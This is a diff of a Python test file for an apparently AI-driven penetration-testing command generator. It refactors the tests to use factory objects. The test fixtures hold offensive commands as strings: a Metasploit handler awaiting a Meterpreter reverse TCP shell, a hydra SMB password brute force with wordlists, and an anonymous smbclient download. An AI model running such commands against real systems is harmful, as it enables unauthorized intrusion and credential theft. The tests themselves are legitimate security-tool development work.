@@ -3,23 +3,24 @@
 from unittest.mock import patch
 
 import pytest
-from wish_models.command_result import CommandInput
-from wish_models.settings import Settings
+from wish_models.test_factories.command_input_factory import CommandInputFactory
+from wish_models.test_factories.command_result_factory import CommandResultSuccessFactory
+from wish_models.test_factories.settings_factory import SettingsFactory
 
-from wish_command_generation_api.models import GraphState
 from wish_command_generation_api.nodes import command_modifier
+from wish_command_generation_api.test_factories.graph_state_factory import GraphStateFactory
 
 
 @pytest.fixture
 def settings():
     """Create a settings object for testing."""
-    return Settings()
+    return SettingsFactory()
 
 
 def test_modify_command_no_commands(settings):
     """Test modifying commands when there are no commands."""
     # Arrange
-    state = GraphState(query="test query", context={})
+    state = GraphStateFactory(query="test query", context={})
 
     # Act
     result = command_modifier.modify_command(state, settings)
@@ -32,23 +33,19 @@ def test_modify_command_no_commands(settings):
 def test_modify_command_dialog_avoidance(mock_modify, settings, mock_command_response):
     """Test dialog avoidance modification."""
     # Create a state with an interactive command
-    state = GraphState(
-        query="Start a Metasploit handler",
-        context={},
-        command_candidates=[CommandInput(command="msfconsole", timeout_sec=60)]
+    state = GraphStateFactory.create_with_command_candidates(
+        "Start a Metasploit handler",
+        ["msfconsole"]
     )
 
     # Mock the modifier to return a modified state
-    expected_result = GraphState(
-        query="Start a Metasploit handler",
-        context={},
-        command_candidates=[
-            CommandInput(
-                command="msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
-                "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\"",
-                timeout_sec=60
-            )
-        ]
+    modified_command = (
+        "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
+        "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+    )
+    expected_result = GraphStateFactory.create_with_command_candidates(
+        "Start a Metasploit handler",
+        [modified_command]
     )
     mock_modify.return_value = expected_result
 
@@ -64,28 +61,19 @@ def test_modify_command_dialog_avoidance(mock_modify, settings, mock_command_res
 def test_modify_command_list_files(mock_modify, settings, mock_list_files_response):
     """Test list files modification."""
     # Create a state with a command using list files
-    state = GraphState(
-        query="Brute force SMB login",
-        context={},
-        command_candidates=[
-            CommandInput(
-                command="hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40",
-                timeout_sec=60
-            )
-        ]
+    state = GraphStateFactory.create_with_command_candidates(
+        "Brute force SMB login",
+        ["hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40"]
     )
 
     # Mock the modifier to return a modified state
-    expected_result = GraphState(
-        query="Brute force SMB login",
-        context={},
-        command_candidates=[
-            CommandInput(
-                command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
-                "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40",
-                timeout_sec=60
-            )
-        ]
+    modified_command = (
+        "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+        "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+    )
+    expected_result = GraphStateFactory.create_with_command_candidates(
+        "Brute force SMB login",
+        [modified_command]
     )
     mock_modify.return_value = expected_result
 
@@ -103,23 +91,19 @@ def test_modify_command_list_files(mock_modify, settings, mock_list_files_respon
 def test_modify_command_both_modifications(mock_modify, settings):
     """Test both dialog avoidance and list files modifications."""
     # Create a state with a command needing both modifications
-    state = GraphState(
-        query="Download user list from SMB share",
-        context={},
-        command_candidates=[CommandInput(command="smbclient -N //10.10.10.40/share", timeout_sec=60)]
+    state = GraphStateFactory.create_with_command_candidates(
+        "Download user list from SMB share",
+        ["smbclient -N //10.10.10.40/share"]
     )
 
     # Mock the modifier to return a modified state
-    expected_result = GraphState(
-        query="Download user list from SMB share",
-        context={},
-        command_candidates=[
-            CommandInput(
-                command="smbclient -N //10.10.10.40/share -c 'get "
-                       "/usr/share/seclists/Usernames/top-usernames-shortlist.txt'",
-                timeout_sec=60
-            )
-        ]
+    modified_command = (
+        "smbclient -N //10.10.10.40/share -c 'get "
+        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
+    )
+    expected_result = GraphStateFactory.create_with_command_candidates(
+        "Download user list from SMB share",
+        [modified_command]
     )
     mock_modify.return_value = expected_result
 
@@ -136,10 +120,9 @@ def test_modify_command_both_modifications(mock_modify, settings):
 def test_modify_command_json_error(mock_modify, settings):
     """Test handling JSON parsing errors."""
     # Create a state with a command
-    state = GraphState(
-        query="test_modify_command_json_error",
-        context={},
-        command_candidates=[CommandInput(command="msfconsole", timeout_sec=60)]
+    state = GraphStateFactory.create_with_command_candidates(
+        "test_modify_command_json_error",
+        ["msfconsole"]
     )
 
     # Act
@@ -155,10 +138,9 @@ def test_modify_command_json_error(mock_modify, settings):
 def test_modify_command_exception(mock_modify, settings):
     """Test handling exceptions during command modification."""
     # Create a state with a command
-    state = GraphState(
-        query="test_modify_command_exception",
-        context={},
-        command_candidates=[CommandInput(command="msfconsole", timeout_sec=60)]
+    state = GraphStateFactory.create_with_command_candidates(
+        "test_modify_command_exception",
+        ["msfconsole"]
     )
 
     # Act
@@ -174,28 +156,24 @@ def test_modify_command_exception(mock_modify, settings):
 def test_modify_command_multiple_commands(mock_modify, settings):
     """Test modifying multiple commands."""
     # Create a state with multiple commands
-    state = GraphState(
-        query="Run multiple commands",
-        context={},
-        command_candidates=[
-            CommandInput(command="msfconsole", timeout_sec=60),
-            CommandInput(
-                command="hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40",
-                timeout_sec=60
-            )
+    state = GraphStateFactory.create_with_command_candidates(
+        "Run multiple commands",
+        [
+            "msfconsole",
+            "hydra -L user_list.txt -P pass_list.txt smb://10.10.10.40"
         ]
     )
 
     # Mock the modifier to return a modified state
-    expected_result = GraphState(
+    expected_result = GraphStateFactory(
         query="Run multiple commands",
         context={},
         command_candidates=[
-            CommandInput(
+            CommandInputFactory(
                 command="msfconsole -q -x \"use exploit/multi/handler; exit -y\"",
                 timeout_sec=60
             ),
-            CommandInput(
+            CommandInputFactory(
                 command="hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                 "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40",
                 timeout_sec=60
@@ -220,28 +198,14 @@ def test_modify_command_preserve_state(mock_modify, settings):
     """Test that the command modifier preserves other state fields."""
     # Create a state with additional fields
     processed_query = "processed test query"
+    failed_command_result = CommandResultSuccessFactory(
+        command="test command",
+        state="SUCCESS",
+        exit_code=0,
+        log_summary="success",
+    )
 
-    # Create a proper CommandResult object
-    from pathlib import Path
-
-    from wish_models.command_result import CommandResult, CommandState, LogFiles
-    from wish_models.utc_datetime import UtcDatetime
-
-    log_files = LogFiles(stdout=Path("/tmp/stdout.log"), stderr=Path("/tmp/stderr.log"))
-    failed_command_results = [
-        CommandResult(
-            num=1,
-            command="test command",
-            state=CommandState.SUCCESS,
-            exit_code=0,
-            log_summary="success",
-            log_files=log_files,
-            created_at=UtcDatetime.now(),
-            timeout_sec=60
-        )
-    ]
-
-    state = GraphState(
+    state = GraphStateFactory(
         query="Start Metasploit",
         context={
             "current_directory": "/home/user",
@@ -249,14 +213,14 @@ def test_modify_command_preserve_state(mock_modify, settings):
             "attacker": {"lhost": "192.168.1.5"}
         },
         processed_query=processed_query,
-        command_candidates=[CommandInput(command="msfconsole", timeout_sec=60)],
-        failed_command_results=failed_command_results,
+        command_candidates=[CommandInputFactory(command="msfconsole", timeout_sec=60)],
+        failed_command_results=[failed_command_result],
         is_retry=True,
         error_type="TIMEOUT"
     )
 
     # Mock the modifier to return a modified state
-    expected_result = GraphState(
+    expected_result = GraphStateFactory(
         query="Start Metasploit",
         context={
             "current_directory": "/home/user",
@@ -264,8 +228,8 @@ def test_modify_command_preserve_state(mock_modify, settings):
             "attacker": {"lhost": "192.168.1.5"}
         },
         processed_query=processed_query,
-        command_candidates=[CommandInput(command="msfconsole -q -x \"exit -y\"", timeout_sec=60)],
-        failed_command_results=failed_command_results,
+        command_candidates=[CommandInputFactory(command="msfconsole -q -x \"exit -y\"", timeout_sec=60)],
+        failed_command_results=[failed_command_result],
         is_retry=True,
         error_type="TIMEOUT"
     )
@@ -283,6 +247,6 @@ def test_modify_command_preserve_state(mock_modify, settings):
     }
     assert result.processed_query == processed_query
     assert "exit -y" in result.command_candidates[0].command
-    assert result.failed_command_results == failed_command_results
+    assert result.failed_command_results == [failed_command_result]
     assert result.is_retry is True
     assert result.error_type == "TIMEOUT"
